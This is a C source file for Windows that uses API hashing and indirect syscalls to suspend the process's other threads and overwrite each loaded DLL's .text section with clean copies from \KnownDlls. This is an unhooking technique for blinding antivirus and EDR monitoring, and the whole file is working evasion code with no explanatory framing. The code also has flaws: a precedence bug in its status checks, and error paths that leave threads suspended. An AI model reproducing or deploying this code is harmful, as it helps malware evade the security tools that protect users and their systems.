#include <Windows.h>
#include "Common.h"
#include "Debug.h"

WINAPI_FUNC WINAPIs = { 0 };
NTAPI_FUNC NTAPIs = { 0 };

BOOL IniDirectCalls() {

	HMODULE hKernel32 = GetModuleHandleH(KERNEL32DLL_CRC32);

	if (!hKernel32)
		return FALSE;

	WINAPIs.pCreateToolhelp32Snapshot = (fnCreateToolhelp32Snapshot)GetProcAddressH(hKernel32, CreateToolhelp32Snapshot_CRC32);
	WINAPIs.pThread32First = (fnThread32First)GetProcAddressH(hKernel32, Thread32First_CRC32);
	WINAPIs.pThread32Next = (fnThread32Next)GetProcAddressH(hKernel32, Thread32Next_CRC32);

	PVOID* ppElement = (PVOID*)&WINAPIs;
	for (INT i = 0; i < sizeof(WINAPI_FUNC) / sizeof(PVOID); i++) {
		if (!ppElement[i]) {
#ifdef DEBUG
			PRINTA("[!] InitializeDirectCalls Failed To Initialize Element Of Offset : %0.2d \n", i);
#endif
			return FALSE;
		}
	}
	return TRUE;
}

BOOL IniIndirectSyscalls() {
	
	if (!FetchNtSyscall(NtOpenSection_CRC32, &NTAPIs.NtOpenSection))
		return FALSE;
	if (!FetchNtSyscall(NtCreateSection_CRC32, &NTAPIs.NtCreateSection))
		return FALSE;
	if (!FetchNtSyscall(NtMapViewOfSection_CRC32, &NTAPIs.NtMapViewOfSection))
		return FALSE;
	if (!FetchNtSyscall(NtUnmapViewOfSection_CRC32, &NTAPIs.NtUnmapViewOfSection))
		return FALSE;
	if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, &NTAPIs.NtProtectVirtualMemory))
		return FALSE;
	if (!FetchNtSyscall(NtOpenThread_CRC32, &NTAPIs.NtOpenThread))
		return FALSE;
	if (!FetchNtSyscall(NtSuspendThread_CRC32, &NTAPIs.NtSuspendThread))
		return FALSE;
	if (!FetchNtSyscall(NtResumeThread_CRC32, &NTAPIs.NtResumeThread))
		return FALSE;
	if (!FetchNtSyscall(NtClose_CRC32, &NTAPIs.NtClose))
		return FALSE;

	return TRUE;
}

BOOL SuspendAndResumeLocalThreads(enum THREADS State) {

	DWORD						dwCurrentProcessId = __readgsqword(0x40);
	DWORD						dwRunningThread = __readgsqword(0x48);
	HANDLE						hSnapShot = INVALID_HANDLE_VALUE,
		hThread = 0x00;
	NTSTATUS					STATUS = 0x00;
	THREADENTRY32		        Thr32 = { .dwSize = sizeof(THREADENTRY32) };
	OBJECT_ATTRIBUTES			ObjAttr = { 0 };
	CLIENT_ID					ClientId = { 0 };

#ifdef DEBUG
	PRINTA("\n");
#endif

	hSnapShot = WINAPIs.pCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
#ifdef DEBUG
		PRINTA("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
#endif
		SET_SYSCALL(NTAPIs.NtClose);
		RunSyscall(hSnapShot);
		return FALSE;
	}

	if (!WINAPIs.pThread32First(hSnapShot, &Thr32)) {
#ifdef DEBUG
		PRINTA("[!] Thread32First Failed With Error : %d \n", GetLastError());
#endif
		SET_SYSCALL(NTAPIs.NtClose);
		RunSyscall(hSnapShot);
		return FALSE;
	}

	do {
		if (Thr32.th32OwnerProcessID == dwCurrentProcessId && Thr32.th32ThreadID != dwRunningThread) {

			InitializeObjectAttributes(&ObjAttr, NULL, NULL, NULL, NULL);

			ClientId.UniqueProcess = (PVOID)Thr32.th32OwnerProcessID;
			ClientId.UniqueThread = (PVOID)Thr32.th32ThreadID;

			SET_SYSCALL(NTAPIs.NtOpenThread);
			if (STATUS = RunSyscall(&hThread, GENERIC_ALL, &ObjAttr, &ClientId) != 0x00 ) {
#ifdef DEBUG
				PRINTA("[!] NtOpenThread Failed With Status : 0x%0.8X \n", STATUS);
#endif
			}

			if (State == SUSPEND_THREADS) {
#ifdef DEBUG
				PRINTA("\t\t>>> Suspending Thread Of Id : %d ... ", Thr32.th32ThreadID);
#endif

				SET_SYSCALL(NTAPIs.NtSuspendThread);
				if (hThread && (STATUS = RunSyscall(hThread, NULL)) != 0x00 ) {
#ifdef DEBUG
					PRINTA("[!] NtSuspendThread Failed With Status : 0x%0.8X \n", STATUS);
#endif
				}
#ifdef DEBUG
				PRINTA("[+] DONE \n");
#endif

			}

			if (State == RESUME_THREADS) {
#ifdef DEBUG
				PRINTA("\t\t>>> Resuming Thread Of Id : %d ... ", Thr32.th32ThreadID);
#endif
				SET_SYSCALL(NTAPIs.NtResumeThread);
				if (hThread && (STATUS = RunSyscall(hThread, NULL)) != 0x00 ) {
#ifdef DEBUG
					PRINTA("[!] NtResumeThread Failed With Status : 0x%0.8X \n", STATUS);
#endif
				}
#ifdef DEBUG
				PRINTA("[+] DONE \n");
#endif
			}

			SET_SYSCALL(NTAPIs.NtClose);
			if (hThread != NULL)
				RunSyscall(hThread);

		}

	} while (WINAPIs.pThread32Next(hSnapShot, &Thr32));

#ifdef DEBUG
	PRINTA("\n");
#endif

	SET_SYSCALL(NTAPIs.NtClose);
	RunSyscall(hSnapShot);
	return TRUE;
}

LPVOID GetDllFromKnownDll(PWSTR DllName) {

	PVOID				pModule = 0x00;
	HANDLE				hSection = 0x00;
	NTSTATUS			STATUS = 0x00;
	SIZE_T				ViewSize = 0x00;
	UNICODE_STRING		UniStr = { 0 };
	OBJECT_ATTRIBUTES	ObjAtr = { 0 };
	WCHAR				FullName[MAX_PATH] = { 0 };
	WCHAR				Buf[MAX_PATH] = { L'\\', L'K', L'n', L'o', L'w', L'n', L'D', L'l', L'l', L's', L'\\' };

	_strcpy(FullName, Buf);
	_strcat(FullName, DllName);
	_RtlInitUnicodeString(&UniStr, FullName);
	InitializeObjectAttributes(&ObjAtr, &UniStr, OBJ_CASE_INSENSITIVE, NULL, NULL);

	SET_SYSCALL(NTAPIs.NtOpenSection);
	if (STATUS = RunSyscall(&hSection, SECTION_MAP_READ, &ObjAtr) != 0x00 ) {
#ifdef DEBUG
		PRINTW(L"[!] NtOpenSection Failed For \"%s\" With Status : 0x%0.8X [THAT'S PROB OK]\n", FullName, STATUS);
#endif
		return NULL;
	}

	SET_SYSCALL(NTAPIs.NtMapViewOfSection);
	if (STATUS = RunSyscall(hSection, NtCurrentProcess(), &pModule, NULL, NULL, NULL, &ViewSize, 1, NULL, PAGE_READONLY) != 0x00 ) {
#ifdef DEBUG
		PRINTW(L"[!] NtMapViewOfSection Failed For \"%s\" With Status : 0x%0.8X \n", FullName, STATUS);
#endif
		return NULL;
	}

	return pModule;
}

BOOL RefreshAllDlls() {

#if _WIN64
	PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
	PPEB pPeb = NULL;
#endif

	if (pPeb == NULL || (pPeb != NULL && pPeb->OSMajorVersion != 0xA)) {
		return FALSE;
	}

	PLIST_ENTRY		Head = NULL,
		Next = NULL;
	NTSTATUS		STATUS = NULL;
	LPVOID			KnownDllDllModule = NULL,
		CurrentDllModule = NULL;
	PVOID			pLocalTxtAddress = NULL,
		pRemoteTxtAddress = NULL;
	SIZE_T			sLocalTxtSize = NULL;
	DWORD			dwOldPermission = NULL;

	Head = &pPeb->LoaderData->InMemoryOrderModuleList;
	Next = Head->Flink->Flink;

	if (!SuspendAndResumeLocalThreads(SUSPEND_THREADS))
		return FALSE;

	while (Next != Head) {

		PLDR_DATA_TABLE_ENTRY	pLdrData = (PLDR_DATA_TABLE_ENTRY)((PBYTE)Next - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));
		PUNICODE_STRING			DllName = (PUNICODE_STRING)((PBYTE)&pLdrData->FullDllName + sizeof(UNICODE_STRING));

		if (HASH(DllName->Buffer) != win32udll_CRC32 && HASH(DllName->Buffer) != WIN32UDLL_CRC32) {
			KnownDllDllModule = GetDllFromKnownDll(DllName->Buffer);
			CurrentDllModule = (LPVOID)(pLdrData->DllBase);

			if (KnownDllDllModule != NULL && CurrentDllModule != NULL) {
				PIMAGE_DOS_HEADER CurrentDllImgDosHdr = (PIMAGE_DOS_HEADER)CurrentDllModule;
				if (CurrentDllImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
					return FALSE;
				}
				PIMAGE_NT_HEADERS CurrentDllImgNtHdr = (PIMAGE_NT_HEADERS)((PBYTE)CurrentDllModule + CurrentDllImgDosHdr->e_lfanew);
				if (CurrentDllImgNtHdr->Signature != IMAGE_NT_SIGNATURE) {
					return FALSE;
				}
				for (INT i = 0; i < CurrentDllImgNtHdr->FileHeader.NumberOfSections; i++) {
					PIMAGE_SECTION_HEADER pImgSec = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(CurrentDllImgNtHdr) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
					if ((*(ULONG*)pImgSec->Name | 0x20202020) == 'xet.') {
						sLocalTxtSize = pImgSec->Misc.VirtualSize;
						pLocalTxtAddress = (PVOID)((ULONG_PTR)CurrentDllModule + pImgSec->VirtualAddress);
						pRemoteTxtAddress = (PVOID)((ULONG_PTR)KnownDllDllModule + pImgSec->VirtualAddress);
					}
				}
				if (sLocalTxtSize == NULL || pLocalTxtAddress == NULL || pRemoteTxtAddress == NULL) {
					return FALSE;
				}

				if (*(ULONG_PTR*)pLocalTxtAddress != *(ULONG_PTR*)pRemoteTxtAddress)
					return FALSE;

				PVOID		 pAddress = pLocalTxtAddress;
				SIZE_T		 sSize = sLocalTxtSize;

#ifdef DEBUG
				PRINTW(L"\n[i] Replacing .txt of %s ... ", DllName->Buffer);
				PRINTA("\n\t> pLocalTxtAddress : 0x%p \n\t> pRemoteTxtAddress : 0x%p \n", pLocalTxtAddress, pRemoteTxtAddress);
#endif
				
				SET_SYSCALL(NTAPIs.NtProtectVirtualMemory);
				if (STATUS = RunSyscall(NtCurrentProcess(), &pAddress, &sSize, PAGE_READWRITE, &dwOldPermission) != 0x00) {
#ifdef DEBUG
					PRINTA("[!] NtProtectVirtualMemory [1] Failed With Status : 0x%0.8X \n", STATUS);
#endif
					return FALSE;
				}

				_memcpy(pLocalTxtAddress, pRemoteTxtAddress, sLocalTxtSize);

				SET_SYSCALL(NTAPIs.NtProtectVirtualMemory);
				if (STATUS = RunSyscall(NtCurrentProcess(), &pAddress, &sSize, dwOldPermission, &dwOldPermission) != 0x00) {
#ifdef DEBUG
					PRINTA("[!] NtProtectVirtualMemory [2] Failed With Status : 0x%0.8X \n", STATUS);
#endif
					return FALSE;
				}

				SET_SYSCALL(NTAPIs.NtUnmapViewOfSection);
				if (STATUS = RunSyscall(NtCurrentProcess(), KnownDllDllModule) != 0x00 ) {
#ifdef DEBUG
					PRINTA("[!] NtUnmapViewOfSection Failed With Status : 0x%0.8X \n", STATUS);
#endif
					return FALSE;
				}
#ifdef DEBUG
				PRINTA("[+] DONE \n");
#endif
			}

		}

		Next = Next->Flink;
	}

	if (!SuspendAndResumeLocalThreads(RESUME_THREADS))
		return FALSE;

	return TRUE;
}
